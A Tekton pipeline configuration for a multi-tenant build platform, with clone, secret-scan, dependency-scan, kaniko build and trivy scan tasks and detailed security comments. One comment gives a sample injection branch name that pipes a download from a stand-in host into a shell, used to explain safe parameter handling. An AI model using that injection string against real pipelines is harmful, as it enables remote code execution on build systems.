# The platform's tenant build pipeline, applied once per tenant namespace.
#
# Namespaced on purpose. A cluster-scoped ClusterTask would be referenceable by
# every tenant, and a tenant able to reference a shared object is a tenant able
# to be affected by another's change to it. One copy per namespace costs a few
# kilobytes and keeps the blast radius at one project.
#
# Task names here are what the tenant sees as step labels in the pipeline
# graph. They are asserted against TEKTON_PIPELINE_TASKS in
# controlplane/runners/tekton.py — rename in both places or the test fails.
#
# The Pipeline object below (tenant-deploy) is NOT what actually runs a
# deploy. render_pipelinerun() in controlplane/runners/tekton.py builds an
# inline pipelineSpec per run instead — the tenant's own .platform.yml
# stages are only known after their repository is read, and a static
# Pipeline cannot express "and then whatever this repo declares". Only the
# Task objects here are referenced at runtime, by name, from that inline
# spec. Keep the Pipeline object's task graph in sync with
# build_pipeline_spec() regardless, since it is what a human sees when they
# run `kubectl describe pipeline tenant-deploy`.
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: clone
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  params:
    - name: repo-url
      type: string
    - name: revision
      type: string
    # Base64, not the file itself. See the env block below.
    - name: dockerfile-b64
      type: string
      default: ""
  workspaces:
    - name: source
  steps:
    - name: clone
      image: alpine/git:v2.45.2
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
      env:
        # Without this git blocks on stdin asking for a username whenever the
        # repository is private or misspelt, and the Pod sits there until the
        # pipeline timeout — minutes spent on a failure knowable immediately.
        - name: GIT_TERMINAL_PROMPT
          value: "0"
        # Params reach the script as ENVIRONMENT, never as text spliced into
        # it. Tekton substitutes $(params.x) textually, so a branch named
        #     "; curl evil.sh | sh; "
        # would be pasted straight into this shell and executed — and the
        # branch is a tenant-supplied string. Read as "$REVISION" the shell
        # treats it as data, whatever it contains.
        - name: REPO_URL
          value: $(params.repo-url)
        - name: REVISION
          value: $(params.revision)
        # Base64 for the same reason, plus a plain one: a Dockerfile contains
        # quotes and newlines (CMD ["true"]), and textual substitution into a
        # quoted shell string mangles it — kaniko then fails with "arrays must
        # be comprised of strings only", which describes neither the cause nor
        # the file.
        - name: DOCKERFILE_B64
          value: $(params.dockerfile-b64)
      script: |
        #!/bin/sh
        set -eu
        git clone --depth 1 --branch "$REVISION" "$REPO_URL" "$(workspaces.source.path)/repo"
        # Drop the git metadata before anything builds from this directory: it
        # carries the remote configuration and, for an authenticated clone, is
        # where a credential would live. A tenant Dockerfile doing `COPY . .`
        # would otherwise bake it into an image and push it to a registry.
        rm -rf "$(workspaces.source.path)/repo/.git"

        # The platform generates a Dockerfile for a plain FastAPI app that has
        # none. Under Tekton the checkout only exists in the cluster, so it is
        # passed in as a parameter and written here — a file written on the
        # control-plane host would never reach kaniko.
        #
        # Never overwrite: a repository that ships its own Dockerfile must
        # build from that one, and the platform's guess would silently replace
        # it with something that builds a different image.
        if [ -n "$DOCKERFILE_B64" ] && [ ! -f "$(workspaces.source.path)/repo/Dockerfile" ]; then
          printf '%s' "$DOCKERFILE_B64" | base64 -d > "$(workspaces.source.path)/repo/Dockerfile"
          echo "No Dockerfile in the repository — wrote the generated one."
        fi
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: secret-scan
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  # Same tool the platform's own CI gates on
  # (.github/workflows/ci-cd.yml: gitleaks blocks build), run here instead of
  # only on request — a committed secret only needs to be missed once.
  workspaces:
    - name: source
  steps:
    - name: gitleaks
      image: zricethezav/gitleaks:v8.18.4
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
      script: |
        #!/bin/sh
        # NOTE: no `set -e`. gitleaks exits 1 when it finds leaks — that is
        # the gate firing, not a crash — and the explicit check below is what
        # distinguishes "found something" from "did not run".
        # A bare --redact, not --redact=true: the flag takes an OPTIONAL
        # uint (percent, default 100 when present with no value) -- "true" is
        # not a valid uint, and gitleaks exits before it scans anything with
        # 'invalid argument "true" for "--redact" flag'. Every finding here
        # is a committed secret, and printing one unredacted into a job log
        # the tenant's whole team can read is the leak this scan exists to
        # catch, so redaction is not optional.
        # --no-git is required: `detect` without it scans git HISTORY, and
        # the clone Task removes .git before this runs (on purpose — a
        # tenant Dockerfile's COPY . . must not bake it into the image).
        # Without .git, gitleaks fails git-log discovery, logs an error, and
        # reports "no leaks found" regardless of what the files contain — a
        # scan that never ran, indistinguishable from a clean one. Every
        # deploy through this Task passed the gate unconditionally until
        # this was caught by actually running one instead of trusting a
        # green PipelineRun.
        gitleaks detect --source "$(workspaces.source.path)/repo" --report-format json --report-path /tmp/report.json --no-banner --redact --no-git
        RC=$?

        # The control plane has no other way to reach this Task's report —
        # its Pod is gone by the time the worker notices the PipelineRun
        # finished. Printed unconditionally, before either exit branch below,
        # so the Security page can show what ran even when the gate blocks.
        echo "===SCAN_REPORT_BEGIN==="
        cat /tmp/report.json 2>/dev/null || echo "[]"
        echo "===SCAN_REPORT_END==="

        # Fails closed, matching every other gate in this pipeline: a
        # checkout that could not be scanned is not one known secret-free.
        if [ "$RC" -ne 0 ] && [ "$RC" -ne 1 ]; then
          echo "Checkout could not be scanned for secrets (gitleaks exited $RC)."
          exit 1
        fi
        if [ "$RC" -eq 1 ]; then
          echo "Deploy blocked: gitleaks found committed secret(s). Remove them from git history, rotate them, and deploy again."
          exit 1
        fi
        echo "gitleaks: no committed secrets found."
      computeResources:
        requests:
          cpu: 50m
          memory: 128Mi
        limits:
          cpu: 250m
          memory: 512Mi
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: dependency-scan
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  # Same tool and the same gate the platform's own CI runs
  # (pip-audit --strict on app/shared/requirements.txt). Skips rather than
  # blocks when there is no requirements.txt: most tenants are not Python,
  # and "no dependency manifest" is not evidence of a vulnerable one.
  workspaces:
    - name: source
  steps:
    - name: pip-audit
      image: python:3.12-slim
      securityContext:
        runAsNonRoot: true
        runAsUser: 65532
        allowPrivilegeEscalation: false
        capabilities:
          drop: ["ALL"]
      # python:3.12-slim's /etc/passwd has no entry for UID 65532, so pip
      # resolves no home directory and falls back to installing into "/",
      # which this non-root user cannot write to: "Permission denied:
      # '/.local'". /tmp is always writable regardless of UID and is
      # container-local scratch space, not tenant source — nothing here
      # needs to survive past this step.
      env:
        - name: HOME
          value: /tmp
      script: |
        #!/bin/sh
        set -eu
        REPO="$(workspaces.source.path)/repo"
        REQ=""
        for candidate in "$REPO/requirements.txt" "$REPO/app/requirements.txt" "$REPO/requirements/base.txt"; do
          if [ -f "$candidate" ]; then REQ="$candidate"; break; fi
        done
        if [ -z "$REQ" ]; then
          echo "pip-audit: no requirements.txt found — skipping dependency scan."
          echo "===SCAN_REPORT_BEGIN==="
          echo "{}"
          echo "===SCAN_REPORT_END==="
          exit 0
        fi

        pip install --quiet --no-cache-dir pip-audit
        # `pip install` with no writable system site-packages (HOME=/tmp
        # above, non-root) falls back to a --user install under
        # $HOME/.local, which is not on PATH by default — pip-audit then
        # reports "installed" but the next line fails with "pip-audit: not
        # found", exit 127, indistinguishable from this script's own view
        # from a real vulnerability finding without reading the pod log.
        export PATH="$HOME/.local/bin:$PATH"
        # --strict is the whole gate: it is exactly what the platform's own
        # CI runs (.github/workflows/ci-cd.yml), with no severity floor. Any
        # known-vulnerable pinned dependency blocks, not only CRITICAL/HIGH —
        # this repository estimates a severity from the CVSS vector for the
        # summary shown in the UI (parse_pip_audit), but the gate itself has
        # never had a floor, so this Task does not invent one either.
        # --format json --output, not stdout: pip-audit's human-readable
        # table and its JSON report cannot both go to the same stream, and
        # the control plane needs the JSON to reach the Security page the
        # same way the sandbox path's does.
        # set -e is active for the rest of this script (the file checks
        # above rely on it); pip-audit exiting 1 on findings is expected,
        # not a crash, so it has to be exempted here the same way the
        # gitleaks and trivy scripts are never run under set -e at all.
        set +e
        pip-audit --requirement "$REQ" --strict --format json --output /tmp/report.json
        RC=$?
        set -e

        echo "===SCAN_REPORT_BEGIN==="
        cat /tmp/report.json 2>/dev/null || echo "{}"
        echo "===SCAN_REPORT_END==="

        if [ "$RC" -ne 0 ]; then
          echo "Deploy blocked: pip-audit found known-vulnerable pinned dependencies."
          exit 1
        fi
        echo "pip-audit: no known-vulnerable pinned dependencies."
      # 512Mi was not enough: `pip install pip-audit` into python:3.12-slim,
      # then running it, OOMKilled the step (exit 137) with no output at all
      # to explain why — a cgroup kill produces no stack trace, no log line,
      # nothing but the exit code. Observed live against this exact pipeline.
      computeResources:
        requests:
          cpu: 50m
          memory: 384Mi
        limits:
          cpu: 500m
          memory: 1Gi
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: build
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  params:
    - name: image
      type: string
    - name: registry-insecure
      type: string
      default: "false"
  workspaces:
    - name: source
    - name: docker-credentials
  steps:
    - name: build-and-push
      # kaniko, not `docker build`: building with the Docker daemon inside a
      # Pod means mounting the node's docker socket, which is root on the node.
      # Handing that to a tenant build would undo every namespace control this
      # pipeline exists to inherit.
      image: gcr.io/kaniko-project/executor:v1.23.2
      env:
        - name: DOCKER_CONFIG
          value: $(workspaces.docker-credentials.path)
      args:
        - --dockerfile=$(workspaces.source.path)/repo/Dockerfile
        - --context=$(workspaces.source.path)/repo
        - --destination=$(params.image)
        - --insecure=$(params.registry-insecure)
        - --insecure-pull=$(params.registry-insecure)
        # Reproducible layers, and no timestamp churn that would make every
        # rebuild of identical source push a different digest.
        - --reproducible
      # `computeResources`, not `resources`: the latter is the v1beta1
      # spelling and the v1 webhook rejects the whole file with
      # "unknown field resources", naming no task.
      # Sized to fit inside the SMALLEST tenant quota with the tenant's own
      # app already running, not to build as fast as the node can.
      #
      # A namespace's quota is limits.cpu = the preset's total vCPU — 2 for
      # `small` (renderers/namespace.py). A build asking for a 2 CPU limit
      # therefore wants the tenant's entire quota and can never be admitted
      # while anything of theirs is running: the TaskRun sits in
      # ExceededResourceQuota until the pipeline times out, naming a number
      # the tenant never chose.
      #
      # A slower build that runs beats a faster one that cannot start.
      computeResources:
        requests:
          cpu: 100m
          memory: 256Mi
        limits:
          cpu: 500m
          memory: 1Gi
---
apiVersion: tekton.dev/v1
kind: Task
metadata:
  name: scan
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  params:
    - name: image
      type: string
    - name: registry-insecure
      type: string
      default: "false"
  workspaces:
    - name: source
  results:
    - name: blocking
      description: Count of CRITICAL and HIGH findings.
  steps:
    - name: trivy
      image: aquasec/trivy:0.56.2
      script: |
        #!/bin/sh
        # NOTE: no `set -e`. A non-zero trivy exit must reach the explicit
        # check below, which fails closed; letting the shell abort here would
        # end the step with no result written and the gate never evaluated.
        INSECURE=""
        if [ "$(params.registry-insecure)" = "true" ]; then INSECURE="--insecure"; fi

        trivy image $INSECURE --quiet --format json \
          --severity CRITICAL,HIGH "$(params.image)" > /tmp/report.json
        RC=$?

        # The gate fails closed, exactly as controlplane/workers/tasks.py does.
        # An image whose vulnerabilities could not be read is not an image
        # known to be safe, and an empty parse is indistinguishable from a
        # clean one — which is how an unscanned image once shipped as passing.
        if [ "$RC" -ne 0 ] || [ ! -s /tmp/report.json ]; then
          echo "Image could not be scanned, so it was not deployed (trivy exited $RC)."
          echo "===SCAN_REPORT_BEGIN==="
          echo "{}"
          echo "===SCAN_REPORT_END==="
          exit 1
        fi

        # Only reaches the console's Security page via this log — trivy's
        # own Pod is gone by the time the worker parses the PipelineRun's
        # result, so there is no other path back to the Scan table. Filtered
        # to CRITICAL/HIGH only (the --severity flag above), so a persisted
        # summary from this Task never carries a MEDIUM or LOW count, unlike
        # the sandbox path's unfiltered scan.
        echo "===SCAN_REPORT_BEGIN==="
        cat /tmp/report.json
        echo "===SCAN_REPORT_END==="

        COUNT=$(grep -o '"Severity":"\(CRITICAL\|HIGH\)"' /tmp/report.json | wc -l)
        printf '%s' "$COUNT" > "$(results.blocking.path)"
        if [ "$COUNT" -gt 0 ]; then
          echo "Image blocked: $COUNT CRITICAL/HIGH findings."
          exit 1
        fi
        echo "No CRITICAL or HIGH findings."
---
apiVersion: tekton.dev/v1
kind: Pipeline
metadata:
  name: tenant-deploy
  labels:
    app.kubernetes.io/part-of: devops-platform
spec:
  params:
    - name: repo-url
      type: string
    - name: revision
      type: string
    - name: image
      type: string
    - name: registry-insecure
      type: string
      default: "false"
  workspaces:
    - name: source
    - name: docker-credentials
  # This Pipeline object is not actually referenced at deploy time — see the
  # note at the top of the file. It is kept complete and correct anyway,
  # because it is the one thing in the cluster a human runs `kubectl describe
  # pipeline` against, and a Pipeline whose task graph does not match what
  # actually runs is worse than no Pipeline object at all.
  results:
    - name: blocking
      value: $(tasks.scan.results.blocking)
  tasks:
    - name: clone
      taskRef:
        name: clone
      params:
        - name: repo-url
          value: $(params.repo-url)
        - name: revision
          value: $(params.revision)
      workspaces:
        - name: source
          workspace: source
    - name: secret-scan
      taskRef:
        name: secret-scan
      runAfter: ["clone"]
      workspaces:
        - name: source
          workspace: source
    - name: dependency-scan
      taskRef:
        name: dependency-scan
      runAfter: ["secret-scan"]
      workspaces:
        - name: source
          workspace: source
    - name: build
      taskRef:
        name: build
      runAfter: ["dependency-scan"]
      params:
        - name: image
          value: $(params.image)
        - name: registry-insecure
          value: $(params.registry-insecure)
      workspaces:
        - name: source
          workspace: source
        - name: docker-credentials
          workspace: docker-credentials
    # There is no separate push task: kaniko builds and pushes in one step, so
    # the image exists in the registry by the time the scan runs. That is what
    # makes scanning the *pushed* image possible rather than a local one — the
    # gate must judge the artifact that would actually be deployed.
    - name: scan
      taskRef:
        name: scan
      runAfter: ["build"]
      params:
        - name: image
          value: $(params.image)
        - name: registry-insecure
          value: $(params.registry-insecure)
      workspaces:
        - name: source
          workspace: source
